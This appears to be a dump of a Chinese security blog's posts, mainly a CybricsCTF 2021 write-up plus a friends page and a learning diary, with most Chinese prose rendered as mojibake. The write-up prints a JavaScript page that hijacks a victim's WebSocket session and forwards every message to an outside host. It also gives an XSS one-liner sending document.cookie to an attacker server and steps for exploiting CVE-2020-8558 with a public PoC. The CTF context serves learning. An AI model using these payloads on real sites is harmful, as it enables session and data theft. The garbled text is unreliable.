p32vhJKrnx_hajUc8nLTFw\n èŠå¤©å®¤ï¼Œadminå’Œtech supportåœ¨ä¸€ä¸ªç§˜å¯†çš„èŠå¤©å®¤å†…ï¼ˆ10ä½æ•°å­—çš„æˆ¿é—´å·ï¼‰ï¼Œtech supportå¯ä»¥è®©adminç»™å‡ºflagï¼ˆåé¢é‚£ä¸ªteam token for the support callæ˜¯è¦ç”¨åˆ°å—è¿˜æ˜¯æ€ä¹ˆæ ·\næŠ“åŒ…ï¼Œçœ‹åˆ°äº†Connection: Upgrade Upgrade: websocketï¼Œè¿™ä¸ªèŠå¤©å®¤æ˜¯å»ºç«‹äº†ä¸€ä¸ªwebsocketè¿æ¥\nï¼ˆwebsocketè¿™å—çŸ¥è¯†å°è±¡ä¸­ä¹‹å‰æ¥è§¦è¿‡ä¸€æ¬¡ ä¹Ÿå°±ä¸€æ¬¡ ç›¸å…³é“¾æ¥è¿˜æ˜¯æ”¾åé¢\né“¾æ¥é‡Œçš„ä¸€ä¸ªcsrfæ”»å‡»çš„å®ä¾‹è·Ÿè¿™ä¸ªæœ‰ç‚¹åƒäº†\nä½†æ˜¯è¿™é‡Œçš„åˆä¸å¤ªä¸€æ ·ï¼Œwebsocketæœ€åˆå»ºç«‹æ—¶çš„httpéƒ¨åˆ† cookieä¸­æœ‰chatroomçš„idï¼Œè¿™ä¸ªå€¼æ˜¯æœªçŸ¥çš„ï¼ˆAdmin and tech support are members of a secret chat room.ï¼‰ï¼›å¦å¤–tech supportæ˜¯å…ˆä¼šå‘*â€˜Hey, i forgot the flag. Can you remind me?â€™*ï¼Œéœ€è¦çš„æ˜¯è§¦å‘ï¼ˆå¦‚æœå®ƒä¸ä¼šè‡ªå·±å‘è¿™ä¸€æ¡å†…å®¹çš„è¯ï¼‰å’Œç›‘å¬å®ƒçš„ä¿¡æ¯ ç„¶åæ•æ‰åˆ°å®ƒçš„ä¸‹ä¸€æ¡adminå‘é€çš„å†…å®¹ï¼Œæ‹¿åˆ°flag\nï¼ˆæ¯”èµ›çš„æ—¶å€™å°±æƒ³åˆ°è¿™é‡Œï¼Œå…·ä½“çš„å®ç°ä¸çŸ¥é“è¯¥æ€ä¹ˆå¼„äº†ï¼Œä»¥ä¸‹æ˜¯çœ‹äº†wpä¹‹åçš„å¤ç°ï¼‰\n5000ç«¯å£å¤„æœ‰Supporté¡µé¢ï¼Œtech supportåœ¨è¿™é‡Œå¯ä»¥è®¿é—®ä»»æ„çš„é¡µé¢å¹¶å»ºç«‹websocketå‘é€æ¶ˆæ¯ï¼Œä¸é™åˆ¶è·¨åŸŸ æ‰€ä»¥å¯ä»¥å°†è‡ªå·±çš„ç½‘ç«™å†™åˆ°è¿™é‡Œï¼Œsupportä¼šå¸¦ç€å®ƒçš„cookieï¼ˆå’Œadminåœ¨ä¸€ä¸ªæˆ¿é—´é‡Œ cookieæ˜¯æˆ¿é—´idï¼‰è¿‡æ¥è®¿é—®ï¼Œç„¶åå€ŸåŠ©jsçš„è„šæœ¬æ‹¿åˆ°å®ƒçš„cookieï¼›ä»¥ä¸‹æ˜¯æ¥è‡ªw\u0026amp;mçš„è„šæœ¬\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var conn; function connect() { conn = new WebSocket(\u0026#34;ws://multichat-cybrics2021.ctf.su/ws\u0026#34;); conn.onclose = function (evt) { var item = \u0026#34;\u0026#34;; if (evt.code === 1003) { item = `Status: ${evt.reason}`; } else { item = \u0026#34;Connection closed.\u0026#34;; } fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(item)) }; conn.onopen = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(\u0026#34;connected\u0026#34;)) }; conn.onmessage = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(evt.data)) }; function b(){ conn.send(\u0026#34;Hey, i forgot the flag. Can you remind me?\u0026#34;) } setTimeout(b,2000); } window.onload = function () { connect(); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; æˆ–è€…éé¢„æœŸè§£ï¼šåœ¨urléƒ¨åˆ†è¿›è¡Œxssï¼Œpayload: javascript:location.href='http://vps/?cookie='+document.cookieï¼ˆæ­¤å¤„ç”¨çš„æ˜¯burp collaboratorï¼‰ç›´æ¥å¯ä»¥è·å–æˆ¿é—´å·ï¼Œè¿å…¥æˆ¿é—´åå‘æ¶ˆæ¯å³å¯æ‹¿åˆ°flag\nå‚è€ƒï¼šHTML5 WebSocket | WebSocketå®‰å…¨é—®é¢˜åˆ†æ WebSocketæ–­å¼€åŸå› åˆ†æ | Request.mode ä½¿ç”¨ Fetch | WorkerOrGlobalScope.fetch() | Burpsuite Collaboratoræ¨¡å—è¯¦è§£ | Running Your Instance of Burp Collaborator Serverï¼ˆåˆ—å…¥å¾…å®Œæˆè®¡åˆ’\nASCII Terminal (Network, Baby, 116 pts)  Author: Artur Khanov (@awengar)\nAt 138.68.83.253:3333 you have an ASCII terminal. It really works, check with the id command\n ncè¿ä¸Šä»¥åå¯ä»¥çœ‹åˆ°ä¸€ä¸ªbash $ï¼Œé¢˜ç›®çš„æç¤ºæ˜¯\u0026quot;ASCII termial\u0026quot;\næŠŠè¦æ‰§è¡Œçš„å‘½ä»¤ä¹Ÿè¡¨ç¤ºæˆè¿™ç§å½¢å¼åå‘é€å³å¯ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯linuxä¸‹çš„toiletå·¥å…·\ntoiletå¯ä»¥æŠŠå­—æ¯æ‹¼æˆç”¨å­—ç¬¦æˆ–å…¶ä»–æ–¹å¼è¡¨ç¤ºçš„æ›´å¤§çš„å­—æ¯ï¼Œå¯ä»¥å¸¦ä¸€äº›å‚æ•°æ¥æ§åˆ¶å­—ä½“ å­—å·ä»¥åŠæ ·å¼ æ¯”å¦‚\nå¯ä»¥ç©å‡ºå¾ˆå¤šèŠ±æ ·~\nä¹¦å½’æ­£é¢˜ï¼Œè¿™é‡Œä½¿ç”¨toilet -f bigascii9 +commandçš„å‘½ä»¤ç”Ÿæˆç»“æœï¼Œå°†ç©ºæ ¼æ¢ä¸º .å†å‘é€å³å¯\ntoilet -f bigascii9 ls \u0026gt; ls.txt cat ls.txt | nc 138.68.83.253 3333 \u0026gt; ls_result.txt toilet -f bigascii9 'cat flag.txt' \u0026gt; cat.txt cat cat.txt | nc 138.68.83.253 2333 \u0026gt; flag.txt ï¼ˆå€¼å¾—æ³¨æ„çš„æ˜¯ å¦‚æœç›´æ¥ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤ç”Ÿæˆç›¸åº”æ–‡ä»¶åç”¨vimç¼–è¾‘å™¨çš„%s/\\s/./gå‘½ä»¤æ¥è¿›è¡Œç©ºæ ¼çš„æ›¿æ¢ï¼Œä¼šå‡ºç°ä¸‹é¢è¿™æ ·çš„æƒ…å†µ é¦–éƒ¨å’Œå°¾éƒ¨éƒ½éœ€è¦æ‰‹åŠ¨ä¿®æ­£ä¸€ä¸‹\næœ€åflagï¼šcybrics{T3553R4C7_15_GOOD}\nâ€”â€”â€”â€”psï¼šåœ¨èµ›åçš„å®˜æ–¹youtubeç›´æ’­è®²è§£ä¸­å±•ç¤ºäº†è¿™ä¸ªascii terminalçš„æºç ï¼Œæ˜¯ä½¿ç”¨pythonç¼–å†™çš„ å¯¹è¿™ä¸ªterminalçš„è¿è¡Œæ„Ÿå…´è¶£çš„å¯ä»¥åˆ°å½•æ’­è§†é¢‘ä¸­çœ‹\nå‚è€ƒï¼šè°ƒçš®æ£è›‹çš„Linuxä¸‹æœ‰è¶£ç»ˆç«¯çš„åˆé›† | Linux Fun - å¦‚ä½•åœ¨ç»ˆç«¯ä¸­åˆ›å»ºASCIIæ–‡æœ¬æ¨ªå¹… | Neofetch - æ˜¾ç¤ºå…·æœ‰åˆ†å‘æ ‡å¿—çš„Linuxç³»ç»Ÿä¿¡æ¯\nLX-100 (Network, Easy, 192 pts)  Author: Vlad Roskov (@mrvos)\nWe were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.\nAnyway, we were discussing CyBRICS flags there, hope thereâ€™s no way to leak them.\nlx100.pcap\n ï¼ˆè¯´å®è¯ï¼ŒpacpåŒ…æ˜¯çœŸçš„ä¸ä¼šçœ‹TAT\né¦–å…ˆçœ‹åˆ°æœ‰HTTPçš„æµé‡ï¼Œè®¿é—®çš„æ˜¯http://192.168.54.1/cam.cgi?mode=getstateï¼Œè¿™æ˜¯Lumix GX80æ‘„åƒå¤´ï¼Œè§†é¢‘æµé€šè¿‡UDPä¼ è¾“ï¼›è¿½è¸ªUDPæµé‡ï¼Œå¯¼å‡ºæµé‡ å¹¶æ‰¹é‡æå–å‡ºå…¶ä¸­çš„jpgæ–‡ä»¶ ï¼ˆä»¥ä¸‹æ˜¯å®˜æ–¹ç»™å‡ºçš„è§£ ä½¿ç”¨äº†tsharkå·¥å…·ï¼ˆå³å‘½ä»¤è¡Œç‰ˆçš„wireshrkï¼ˆä½†æ˜¯è¿™ç§æ–¹æ³•æœ¬åœ°å¤ç°å¤±è´¥ å¯¼å‡ºçš„jpgæ— æ³•æ­£å¸¸è§£æ ä½†æ˜¯å®˜æ–¹è§†é¢‘ä¸­ç¡®å®è¿™æ ·å¯ä»¥æˆåŠŸ emmmm\ntshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data \u0026gt; hex.txt php -a foreach(file(\u0026quot;hex.txt\u0026quot;)as $i =\u0026gt; $ln) {file_put_contents(\u0026quot;frame$i.jpg\u0026quot;,hex2bin(trim($ln)));} ï¼ˆä»¥ä¸‹æ˜¯åœ¨åˆ«çš„wpä¸­çœ‹åˆ°çš„pyè„šæœ¬ï¼š å¯æˆåŠŸå¤ç° å¯¼å‡º455å¼ jpgå›¾\nimport pyshark cap = pyshark.FileCapture(\u0026#39;lx100.pcap\u0026#39;) count = 0 for packet in cap: if \u0026#34;UDP\u0026#34; in packet and int(packet[\u0026#39;udp\u0026#39;].srcport) == 65415: count = count + 1 udp_bytes = bytearray.fromhex(packet.data.data[packet.data.data.find(\u0026#39;ffd8ffdb\u0026#39;):]) file_out = open(\u0026#39;out_files/\u0026#39; + str(count) + \u0026#39;_packet.jpg\u0026#39;, \u0026#39;wb\u0026#39;) file_out.write(udp_bytes) æ”¾å¤§ å†æ”¾å¤§ æ¯ä¸€æ ¹ æœ€åçš„flagæ˜¯ cybrics{Lost_Secrets_In_The_AIr}\nlocalhost (Network, Hard, 267 pts)  Author: Vlad Roskov (@mrvos)\nRemember NET fleeks? Iâ€™ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.\nssh localhost@109.233.61.10 Password: ohx7eeQu Your team token \u0026gt; Sw0T5cecsfJfaKApOiKzsA\n å…ˆsshè¿ä¸Šçœ‹çœ‹æƒ…å†µï¼ˆå›¾ä¸­æœ‰ä¸€å¥å‘½ä»¤è¾“é”™äº† åº”è¯¥æ˜¯routes ç•™ä¸‹äº†è‹±è¯­ä¸å¥½çš„æ³ªæ°´\nè‡ªå¸¦python2 python3 nmapï¼Œå¹¶ä¸”æœ¬èº«å°±æ˜¯rootèº«ä»½ï¼Œæ‰«ä¸€ä¸‹å†…ç½‘ç½‘æ®µnmap -sS -Pn 10.193.10.7/24\nå‘ç°10.193.10.180çš„80ç«¯å£å¼€æ”¾ï¼Œç”¨curlè®¿é—®\næç¤ºFlag-containing-Records æ¥ç€è®¿é—®ä¸¤ä¸ªè¶…é“¾æ¥çš„å†…å®¹\ncurl 10.193.10.180/redis.confæ˜¯redisçš„é…ç½®æ–‡ä»¶ï¼Œå‡ ä¹æ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯è¢«æ³¨é‡Šæ‰çš„ç¤ºä¾‹å†…å®¹ï¼Œæœ‰ç”¨çš„å°±å†…å®¹å¹¶ä¸å¤šï¼š\nbind 127.0.0.1 protected-mod yes port 6379 curl 10.193.10.180/sysctl.confä¹Ÿæ˜¯ç›¸å…³çš„é…ç½®æ–‡ä»¶ åªæœ‰ä¸€å¥æ²¡è¢«æ³¨é‡Š\nnet.ipv4.conf.all.route_localnet=1 æŸ¥googleï¼Œå‘ç°äº†è¿™äº›ï¼šnet.ipv4.conf.all.route_localnet=1 opens security issue #90259 | POC-2020-8558\næ˜¯ä¸€ä¸ªå»å¹´çˆ†å‡ºçš„cveï¼Œå…·ä½“çš„å†…å®¹ æˆå› ä»¥åŠèƒŒæ™¯çŸ¥è¯†ä¸å¤šèµ˜è¿° ä¸Šé¢çš„é“¾æ¥ä¸­å†™çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œæ‘˜å–å‡ æ®µï¼š\n In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the net.ipv4.conf.all.route_localnet=1 sysctl setting. According to the kernel documentation, this setting makes the kernel \u0026ldquo;not consider loopback addresses as martian\u0026rdquo; \u0026ndash; a consequence of which is that they could be accessed by other nodes on the network. That\u0026rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!\n\u0026hellip;\u0026hellip;\nA normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting net.ipv4.conf.all.route_localnet=1 changes that \u0026ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.\nSo, if an attacker has a local connection to a target node with net.ipv4.conf.all.route_localnet=1, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.\nNote that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker\u0026rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.\n ï¼ˆä¸å¾—ä¸è¯´ipv4å½“åˆæŠŠæ•´ä¸ª127.0.0.0/8çš„åœ°å€éƒ½ç»™äº†æœ¬åœ°å›ç¯ç”¨çœŸçš„æ˜¯å¤ªæ…·æ…¨äº†\u0026hellip;\u0026hellip; åˆ°ipv6å°±åªæœ‰ä¸€ä¸ª:: 1\nåœ¨è¿™é‡Œç›´æ¥ç”¨pocæ‰“å³å¯ï¼Œå…³äºtest.pyå’Œpoc.pyè¿™é‡Œä¹Ÿæ‘˜å–ä¸€ä¸‹è¯´æ˜\n tst-2020-8558.py Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to 127.0.0.1 via your target, and looks to see if there is a reply.\npoc-2020-8558.py Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default). Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal. Because this script uses raw sockets to send and receive the \u0026ldquo;localhost\u0026rdquo; packets, it works fine inside a normal unprivileged container.\n å› ä¸ºéœ€è¦nc æ‰€ä»¥å¦å¼€ä¸€ä¸ªshell\nå‚è€ƒï¼šwp | ä¸ºä»€ä¹ˆæ•´ä¸ª127.*ç½‘æ®µéƒ½è¢«æ‹¿æ¥å½“åšç¯å›åœ°å€äº†ï¼Ÿ\n æœ¬äººæ¯”è¾ƒèœï¼Œåªåšå‡ºæ¥äº†ç­¾åˆ°é¢˜å’Œå‡ ä¸ªwebï¼Œå…¶ä½™å‡ä¸ºèµ›åå¤ç›˜ï¼Œæ­¤å¤„æ˜¯å‚è€ƒwp\né“é˜»ä¸”é•¿å‘€ï¼Œæš‘å‡è¦å¥½å¥½åŠªåŠ›å’¯ (ã¤Ğ´âŠ‚) å‚ç…§ä¸€äº›æ•™ç¨‹æŠŠç®€å•çš„åšå®¢ä¹Ÿæ­èµ·æ¥äº†ï¼Œä»¥åè¦æŠŠè¿™ä¸ªå°çªæ…¢æ…¢ä¸°å¯Œèµ·æ¥(ã‚âˆ€ï½¥)â˜†\n","date":"2021-07-29T17:02:12+08:00","permalink":"https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/","section":"posts","tags":["wp"],"title":"CybricsCTF2021 Wp"},{"categories":[],"contents":"å¥½åƒè¿˜æ˜¯ç©ºç©ºå¦‚ä¹Ÿ\u0026hellip;.(Â´_ã‚`)\næ¬¢è¿äº’æ¢å‹é“¾ï¼ï¼æ¬¢è¿æ‰©åˆ—å¹æ°´ï¼ï¼!\ná••(á›)á•—\n","date":"2021-07-27T14:37:22+08:00","permalink":"https://amiaaaz.github.io/friends/","section":"","tags":[],"title":"Friends"},{"categories":[],"contents":"æ—¶é—´é£é€ï¼Œä¸€çœ¨çœ¼è¿›å…¥å¤§å­¦å·²ç»å¿«ä¸€å¹´äº†ï¼Œä½†æ—¶å¸¸è§‰å¾—æŠ¥é“å…¥æ ¡å°±åœ¨æ˜¨å¤©ã€‚\nå»å¹´12æœˆå¼€å§‹æ¥è§¦åˆ°ctfï¼Œ0åŸºç¡€ï¼Œæ¯å‘¨æœ«åšä¸€åšctfhubçš„æŠ€èƒ½æ ‘ï¼Œå½“æ—¶å¯¹æ•´ä¸ªè®¡ç®—æœºä¸–ç•Œç®—æ˜¯å®Œå…¨å°ç™½ é‡åˆ°ä¸€ä¸ªåè¯å°±è¦æŸ¥ä¸€æŸ¥ä»€ä¹ˆæ„æ€ï¼Œç»å¸¸æ˜¯çœ‹ä¸ªåŠå¤©è¿˜æ˜¯ä¸€çŸ¥åŠè§£ï¼Œåšé¢˜ä¹Ÿåªèƒ½æœºæ¢°çš„é‡å¤ä¸€ä¸‹æœåˆ°çš„wpé‡Œçš„æ­¥éª¤ï¼Œæœ‰æ ·å­¦æ ·ã€‚ä¹Ÿå°±åšæŒäº†1ä¸ªæœˆï¼Œå°±å¼€å§‹å¤ä¹ æœŸæœ«è€ƒè¯•â†’è€ƒè¯•â†’æ”¾å‡ï¼Œå¯’å‡ç®—æ˜¯åœ¨å®¶é‡Œèººè¿‡å»çš„ï¼Œæ¯å¤©å®…ç€çœ‹çœ‹å‰§ åˆ·åˆ·æ‰‹æœºï¼Œç¢Œç¢Œæ— ä¸ºçš„ä»€ä¹ˆéƒ½ä¸æƒ³å¹²ï¼›ä¸´è¿‘å¼€å­¦äº†ï¼Œæ‰å¦‚æ¢¦åˆé†’èˆ¬çš„æ‚”æ‚Ÿï¼Œçœ‹äº†ä¸¤æœ¬ä¹¦ï¼Œæ£é¼“äº†ä¸‹æ‰‹æœºï¼Œæµ…æµ…åœ°äº†è§£äº†ä¸€ä¸‹å®‰å“çš„åˆ·æœºå’Œææœºçš„ç›¸å…³çŸ¥è¯†ã€‚\nä¸‰æœˆåº•æ­£å¼å¼€å­¦ï¼Œå››æœˆåˆå¼€å§‹æŠŠâ€œè’åºŸâ€çš„ctfé¢˜ç»§ç»­æ¡èµ·æ¥ï¼Œä»ä¹‹å‰çš„æ¯å‘¨æœ«åšåšé¢˜å˜æˆäº†æ¯å¤©æ™šä¸Šéƒ½æ‹¿å‡ºæ—¶é—´æ¥å­¦ä¹ ã€‚å½“æ—¶è™½ç„¶å¯¹å®‰å…¨è¿˜æ˜¯æ‡µæ‡‚çš„è®¤è¯†ï¼Œä½†æ˜¯æˆ‘çš„ç›´è§‰å‘Šè¯‰æˆ‘è¿™å°±æ˜¯æˆ‘çš„çˆ±å¥½ï¼Œæ˜¯èƒ½å¸¦æ¥æˆå°±æ„Ÿå’Œå¿«ä¹çš„ä¸œè¥¿ï¼Œæˆ‘æ„¿æ„èŠ±æ—¶é—´å»ç¢ç£¨å®ƒã€‚ä¹Ÿæ˜¯å››æœˆï¼Œçœ‹äº†ã€Šç½‘ç»œæ˜¯æ€æ ·è¿æ¥çš„ã€‹ã€Šå›¾è§£httpã€‹å’Œã€Šå›¾è§£tcp/ipã€‹ï¼Œæ­£å¼çš„äº†è§£äº†ä¸€ä¸‹è®¡ç½‘ï¼ˆè™½ç„¶ä¹Ÿåªæ˜¯ä¸ªå…¥é—¨ï¼‰ï¼›åšå®Œctfhubçš„webéƒ¨åˆ†ä¹‹åï¼Œä¹Ÿç®—æ˜¯å¯¹ctfé‡Œwebéƒ¨åˆ†çš„åŸºæœ¬ç±»å‹éƒ½è§è¿‡äº†ï¼Œå¼€å§‹åœ¨buuojä¸ŠçœŸæ­£åšä¸€äº›ctfçš„é¢˜ã€‚\nç„¶è€Œåˆ°çœŸæ­£åˆ°åšctfé¢˜çš„æ—¶å€™å‘ç°è‡ªå·±åˆæ˜¯é‚£æ ·çš„æ¸ºå°ï¼Œæ‹¿åˆ°ä¸€é“é¢˜ä¹Ÿåªèƒ½æŠ“åŒ…ã€æ‰«ç›®å½•ï¼Œå¥½ä¸€ç‚¹çš„èƒ½æ‹¿åˆ°æ³„éœ²çš„æºç ï¼Œå¯æ˜¯åˆ°ä»£ç å®¡è®¡åˆæ˜¯å®Œå…¨çš„ç¨€çƒ‚ï¼Œjsä¸ä¼šçœ‹ phpä¸ä¼šçœ‹ javaæ›´ä¸ä¼šçœ‹ï¼Œç”šè‡³è¿å¤æ‚ä¸€ç‚¹çš„pythonä¹Ÿä¸ä¼šçœ‹ï¼Œä¸€ä¸ªç±»å‹çš„é¢˜ ç¨å¾®å˜ä¸ªèŠ±æ · æ‹ä¸ªå¼¯å°±åˆçœ‹ä¸æ‡‚äº†ï¼Œä¸€å‰¯ç—›è‹¦é¢å…·ï¼›ç°åœ¨å›è¿‡å¤´æ¥çœ‹ å¾ˆåº†å¹¸å½“æ—¶å³ä½¿é‡åˆ°äº†ç§ç§é—®é¢˜ä¹Ÿæ²¡æ‰“é€€å ‚é¼“ï¼Œæ²¡è§è¿‡çš„å‡½æ•°å°±å»æœæ–‡æ¡£ çœ‹ç”¨æ³•ï¼Œæ²¡è§è¿‡çš„çŸ¥è¯†ç‚¹å°±å»æœç›¸å…³èµ„æ–™ï¼Œçœ‹ä¸æ‡‚çš„é¢˜å°±å¤šçœ‹å‡ ä¸ªä¸åŒçš„wp ç„¶åå¤ç° ç”¨è‡ªå·±çš„è¯å†æ•´ç†å‡ºæ¥ æ‰“å¥½tagæ”¾åˆ°notionä¸Šã€‚\nå¾ˆå¿«åˆ°äº†äº”æœˆï¼Œäº”æœˆåˆæŠŠè€æ—§åšé‡çš„ç”µè„‘æ¢æ‰äº†ï¼Œæ–°ä¸Šæ‰‹çš„è£…å¤‡æå‡äº†ä¸å°‘å­¦ä¹ çš„èˆ’é€‚æ„Ÿï¼›è¿™æ®µæ—¶é—´ä¹Ÿå¤¹æ‚ç€åšäº†ä¸€ç‚¹burpsuite portswiggerçš„é¢˜ï¼ˆè¿™å—åšçš„ä¸å¤ªæ‰å®ï¼Œè€Œä¸”å½“æ—¶åšçš„æ—¶å€™æ²¡æœ‰ç”¨å›¾åºŠ ç¬”è®°é‡Œçš„å›¾ç‰‡ä¹Ÿéƒ½ä¸¢æ‰äº† ä¹‹åå¾—å›è¿‡å¤´æ¥é‡æ–°çœ‹çœ‹ï¼‰ï¼Œä¹Ÿå¤¹æ‚åšäº†å‡ ä¸ªå•ç‹¬ç±»å‹çš„é¶åœºï¼›ç„¶åæ˜¯ä¸¤å‘¨éš¾ç†¬çš„å†›è®­ã€‚è™½ç„¶å†›è®­éš¾ç†¬ï¼Œä½†æ˜¯è¿‡çš„çœŸçš„å¾ˆå¿«ä¹ã€‚è¿™é‡Œå°±æ˜¯æ‡‚çš„éƒ½æ‡‚äº†ï¼Œä¸è¯¦è¯´ã€‚å¼€å¿ƒå¿«ä¹çš„å‡ ä¸ªæœˆï¼Œæˆ‘å°†æ°¸è¿œé“­è®°ã€‚\nå†›è®­å›æ¥ä»¥åå°±å…­æœˆäº†ï¼Œç®—æ˜¯è¿›å…¥æ­£è½¨ï¼Ÿä¸çŸ¥é“è¿™æ ·è¯´æ˜¯ä¸æ˜¯å¾ˆåˆé€‚ï¼Œå¯¹å¾ˆå¤šé¢˜ç›®ä¹Ÿæ˜¯ä¸€å›ç”Ÿ äºŒå›ç†Ÿï¼Œä»ä¸€å¼€å§‹çš„å®Œå…¨ä¸çŸ¥é“ä»å“ªé‡Œä¸‹æ‰‹åˆ°ç¨å¾®èƒ½åˆ†æä¸€ç‚¹ï¼ˆè™½ç„¶è¿˜æ˜¯ä¸èƒ½è„±ç¦»wpç‹¬è‡ªè¡Œèµ°ï¼‰ï¼Œå¯èƒ½å¯¹äºä¸€äº›æœ‰å¤©èµ‹çš„å¤§ä½¬æ¥è¯´è¿™äº›è½»è½»æ¾æ¾ï¼Œæˆ‘å¯èƒ½èŠ±å‡ ä¸ªå°æ—¶èƒ½ææ‡‚çš„ä¸œè¥¿åªéœ€è¦åˆ«äººä¸€ä¸ªå°æ—¶èƒ½ç†è§£é€ï¼Œä½†æ˜¯æˆ‘å·²ç»å¾ˆæ»¡æ„äº†ï¼Œé‚£å¥è¯æ€ä¹ˆè¯´ï¼Ÿâ€œè¿›ä¸€å¯¸æœ‰ä¸€å¯¸çš„æ¬¢å–œâ€ï¼Œæˆ–è®¸å°±æ˜¯è¿™æ ·å§ï¼Œè™½ç„¶æ¯å¤©æ˜¯ç¬¨æ‹™åœ°å­¦ç€ï¼Œä½†ä¹Ÿå¼€å¿ƒã€‚\nä¹Ÿæ˜¯å…­æœˆä¹‹åï¼Œå¼€å§‹å…³æ³¨æ¼æ´ã€æ¸—é€ã€æ”»é˜²ç­‰ç­‰å®‰å…¨æ–¹é¢æ ¸å¿ƒå‘çš„ä¸€äº›ä¸œè¥¿ï¼Œå¼€å§‹æ¯å¤©æŠ½å‡ºæ—¶é—´çœ‹å®‰å…¨ç±»çš„å…¬ä¼—å·æ–‡ç« ï¼Œä¸€å¼€å§‹åªæ˜¯ä¸æ˜è§‰å‰â€”â€”å“‡ è™½ç„¶çœ‹ä¸æ‡‚æ˜¯åœ¨å¹²ä»€ä¹ˆ ä½†æ˜¯å¥½nb å¥½å‰å®³ï¼Œçœ‹çš„å¤šäº†ä¸€ç‚¹ä»¥åå¼€å§‹æ…¢æ…¢æ˜ç™½é‚£äº›é«˜å¤§ä¸Šçš„åè¯æ˜¯ä»€ä¹ˆæ„æ€ï¼ŒåŸæ¥ç½‘ç»œå®‰å…¨çš„ä¸–ç•Œæ˜¯é‚£ä¹ˆè®©äººç€è¿·ã€‚ä¹Ÿå¼€å§‹æ­£å¼æ¥è§¦ctfæ¯”èµ›ï¼ˆè™½ç„¶ä¹Ÿå°±æ˜¯è¿›å»ç­¾ä¸ªåˆ°çš„æ°´å¹³â€¦â€¦ï¼‰ï¼Œå¼€å§‹åšvulnhubçš„é¶æœºï¼Œå¼€å§‹å¤ç›˜ä¹‹å‰åšè¿‡çš„é¢˜ï¼Œæ…¢æ…¢çš„ æ—å¾åšå¼• ä¸€ç‚¹ç‚¹çš„ä¸°å¯ŒçŸ¥è¯†ä½“ç³»ã€‚\nç°åœ¨å·²ç»æ˜¯7æœˆä¸­æ—¬äº†ï¼Œå¾ˆå¿«å°±è¦ä»å¤§ä¸€çš„èœé¸¡å˜ä¸ºå¤§äºŒçš„èœé¸¡äº†ï¼Œå›é¡¾è¿™ä¸€å¹´çš„å­¦ä¹ å’Œç”Ÿæ´»ä¹Ÿæ˜¯æ„Ÿæ…¨è‰¯å¤šã€‚æ»¡æ‰“æ»¡ç®—ï¼Œæ¥è§¦å®‰å…¨æ˜¯ä¸åˆ°å››ä¸ªæœˆå§ï¼Œç®—æ˜¯ä¹Ÿä¸çŸ­äº†ï¼Œå¯æ˜¯è®¤çœŸæ‹ä¸€ä¸‹æ•´ä¸ªçš„è¿‡ç¨‹ åˆæ˜¯æ¼æ´ç™¾å‡ºâ€”â€”ä»£ç å®¡è®¡èƒ½åŠ›ç¨€çƒ‚ï¼Œç»å¸¸åˆ†æä¸å‡ºæ¥é—®é¢˜æ‰€åœ¨çš„åœ°æ–¹ï¼›é€»è¾‘é“¾æ¡ä¸€é•¿çš„é¢˜ç›®å°±æ€ç»´å‘†æ» æ€»æ˜¯ä¼šä¸‹æ„è¯†åœ°æƒ³æ”¾å¼ƒ è¿™çœŸçš„ä¸æ˜¯ä¸ªå¥½ç°è±¡ï¼›sqliå’Œuploadç±»çš„é¢˜åšäº†ä¸å°‘ï¼Œä½†è¿˜æ˜¯ä¸èƒ½è‡ªå·±ç‹¬ç«‹çš„ å®Œå…¨ä¸å‚è€ƒåˆ«äººçš„wpå®Œæˆä¸€æ•´ä¸ªåˆ†æè¿‡ç¨‹ï¼›å¯¹äºpythonçš„æŒæ¡ä¸å¤Ÿå¥½ï¼Œæ˜æ˜¾ååº”åœ¨ä»»ä½•éœ€è¦ç¼–å†™pyè„šæœ¬çš„é¢˜ç›®ä¸Šï¼›å¯¹ä¸€äº›çŸ¥è¯†ç‚¹â€”â€”ä¸è¯´ä¸€äº›äº†ï¼Œå¯ä»¥è¯´æ˜¯å…¨éƒ¨çš„ä¸œè¥¿çš„äº†è§£å’Œè®¤è¯†éƒ½è¿˜æ˜¯æµ…å°è¾„æ­¢ï¼Œåœç•™åœ¨çº¸é¢ä¸Šçš„èŠ±æ¶å­ï¼Œæ¯”å¦‚ååºåˆ—åŒ– 